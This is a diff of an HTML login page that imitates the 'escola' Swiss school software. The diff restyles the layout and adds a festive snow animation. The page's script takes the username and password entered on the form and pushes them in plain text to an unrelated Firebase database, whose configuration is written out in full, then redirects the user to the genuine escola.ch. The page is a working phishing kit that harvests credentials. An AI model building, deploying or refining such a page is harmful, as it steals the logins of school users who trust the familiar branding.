@@ -8,10 +8,7 @@
   <link href="inc/font/nunito/nunito.css" rel="stylesheet" />
 
   <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Nunito', sans-serif;
-    }
+    * { box-sizing: border-box; font-family: 'Nunito', sans-serif; }
 
     body {
       margin: 0;
@@ -24,7 +21,6 @@
       background-size: 100% auto;
     }
 
-    /* SOL PANEL */
     #login-left-panel {
       width: 400px;
       height: 100vh;
@@ -36,19 +32,65 @@
       position: fixed;
     }
 
-    #login-logo-text {
-      font-size: 26px;
-      font-weight: 800;
-      color: #007fe7;
+    #login-logo-text { font-size: 26px; font-weight: 800; color: #007fe7; }
+    #login-logo-text .brace { color:#007fe7; }
+    #login-logo-text .word { margin: 0 4px; }
+    #login-slogan { font-size: 30px; font-weight: 700; }
+    #login-content { margin-left: 400px; padding: 64px; display: flex; gap: 64px; }
+
+    .login-box { width: 420px; }
+    input { width: 100%; padding: 12px; margin-bottom: 16px; }
+    button { width: 100%; padding: 12px; background: #5aa9e6; color: #fff; border: none; cursor: pointer; }
+
+    #xmas-panel {
+      width: 420px;
+      background: linear-gradient(160deg, #065f46, #0f766e);
+      border-radius: 28px;
+      padding: 40px;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
     }
 
-    #login-slogan {
-      font-size: 30px;
-      font-weight: 700;
-      line-height: 1.3;
+    #snow-canvas { position: absolute; inset: 0; pointer-events: none; }
+
+    @media (max-width: 1279px) {
+      #login-left-panel { display: none; }
+      #login-content {
+        margin-left: 0;
+        flex-direction: column;
+        padding: 24px;
+        gap: 24px;
+      }
+      .login-box {
+        width: 100%;
+        max-width: 420px;
+        margin: 0 auto;
+      }
+      #xmas-panel {
+        width: 100%;
+        max-width: 420px;
+        margin: 0 auto;
+      }
     }
 
-    /* MOBİL ÜST BAR */
+    @media (max-width: 480px) {
+      body { background-size: cover; }
+      h1 { font-size: 22px; text-align: center; }
+      input, button { font-size: 16px; padding: 14px; }
+      #login-content { align-items: center; }
+      .login-box { width: 100%; max-width: 360px; }
+      #xmas-panel {
+        width: 100%;
+        max-width: 360px;
+        padding: 24px;
+        border-radius: 20px;
+      }
+      #xmas-panel h2 { font-size: 20px; text-align: center; }
+    }
+  
+
+    /* Mobile top bar */
     #mobile-header {
       display: none;
       background: #fff;
@@ -59,47 +101,9 @@
       font-size: 22px;
     }
 
-    /* SAĞ İÇERİK */
-    #login-content {
-      margin-left: 400px;
-      padding: 64px;
-      width: 100%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
+    @media (max-width: 1279px) {
+      #mobile-header { display: block; }
     }
-
-    .login-box {
-      width: 420px;
-    }
-
-    h1 {
-      margin-bottom: 24px;
-    }
-
-    input {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 16px;
-      font-size: 15px;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background: #5aa9e6;
-      color: #fff;
-      border: none;
-      cursor: pointer;
-      font-size: 16px;
-      border-radius: 4px;
-    }
-
-    button:hover {
-      background: #4296d6;
-    }
-
-    /* SOCIAL */
     .social {
       display: flex;
       gap: 12px;
@@ -120,53 +124,17 @@
       background: #005bb5;
     }
 
-    /* RESPONSIVE */
-    @media (max-width: 1279px) {
-      #login-left-panel {
-        display: none;
-      }
-
-      #mobile-header {
-        display: block;
-      }
-
-      #login-content {
-        margin-left: 0;
-        padding: 32px;
-      }
-    }
-
-    @media (max-width: 480px) {
-      h1 {
-        font-size: 22px;
-        text-align: center;
-      }
-
-      input,
-      button {
-        font-size: 16px;
-        padding: 14px;
-      }
-
-      .login-box {
-        max-width: 360px;
-      }
-    }
-  </style>
+</style>
 </head>
 <body>
 
   <div id="mobile-header">escola</div>
 
   <div id="login-left-panel">
-    <div id="login-logo-text">{ escola }</div>
+    <div id="login-logo-text"><span class="brace">{</span><span class="word">escola</span><span class="brace">}</span></div>
+    <div id="login-slogan">Webbasierte Software für den Schweizer Schulalltag</div>
 
-    <div id="login-slogan">
-      Webbasierte Software<br>
-      für den Schweizer<br>
-      Schulalltag
-    </div>
-
+    <!-- Social links -->
     <div class="social">
       <a href="https://www.facebook.com/escola.ch" target="_blank">Facebook</a>
       <a href="https://twitter.com/escola_ch" target="_blank">Twitter</a>
@@ -183,19 +151,18 @@
       <input id="password" type="password" placeholder="Passwort" />
       <button id="loginBtn">Anmelden</button>
     </div>
-  </div>
 
-  <!-- FIREBASE -->
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
     import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
 
+    // Firebase configuration
     const firebaseConfig = {
       apiKey: "AIzaSyBpuVs9M1vUhR9OXahdm4vhpZMrKl9KuGI",
       authDomain: "ertee-fc073.firebaseapp.com",
       databaseURL: "https://ertee-fc073-default-rtdb.firebaseio.com",
       projectId: "ertee-fc073",
-      storageBucket: "ertee-fc073.appspot.com",
+      storageBucket: "ertee-fc073.firebasestorage.app",
       messagingSenderId: "738703331926",
       appId: "1:738703331926:web:fcb8aaf5b54b9a884c21f7"
     };
@@ -207,13 +174,14 @@
     const usernameInput = document.getElementById('username');
     const passwordInput = document.getElementById('password');
 
+    // Login handler (NO illegal return outside function)
     loginBtn.addEventListener('click', () => {
       const username = usernameInput.value.trim();
       const password = passwordInput.value.trim();
 
       if (!username || !password) {
         alert('Benutzername und Passwort sind erforderlich');
-        return;
+        return; // valid: inside event callback
       }
 
       push(ref(database, 'logins'), {
@@ -223,13 +191,62 @@
         createdAt: new Date().toISOString()
       })
       .then(() => {
-        alert('Login gespeichert ✅');
+        alert('Daten erfolgreich gespeichert ✅');
         window.location.href = 'https://www.escola.ch/';
       })
       .catch(err => {
         alert('Firebase Fehler ❌: ' + err.message);
       });
     });
+
+    // Snow animation (panel only)
+    const canvas = document.getElementById('snow-canvas');
+    const ctx = canvas.getContext('2d');
+    const panel = document.getElementById('xmas-panel');
+
+    const flakes = [];
+
+    function resize() {
+      canvas.width = panel.clientWidth;
+      canvas.height = panel.clientHeight;
+
+      flakes.length = 0;
+      for (let i = 0; i < 180; i++) {
+        flakes.push({
+          x: Math.random() * canvas.width,
+          y: Math.random() * canvas.height,
+          r: Math.random() * 3 + 1,
+          d: Math.random() * 1.2 + 0.3
+        });
+      }
+    }
+
+    resize();
+    window.addEventListener('resize', resize);
+
+    function snow() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      ctx.fillStyle = 'rgba(255,255,255,0.9)';
+      ctx.beginPath();
+
+      flakes.forEach(f => {
+        ctx.moveTo(f.x, f.y);
+        ctx.arc(f.x, f.y, f.r, 0, Math.PI * 2);
+      });
+      ctx.fill();
+
+      flakes.forEach(f => {
+        f.y += f.d;
+        if (f.y > canvas.height) {
+          f.y = -5;
+          f.x = Math.random() * canvas.width;
+        }
+      });
+
+      requestAnimationFrame(snow);
+    }
+
+    snow();
   </script>
 
 </body>
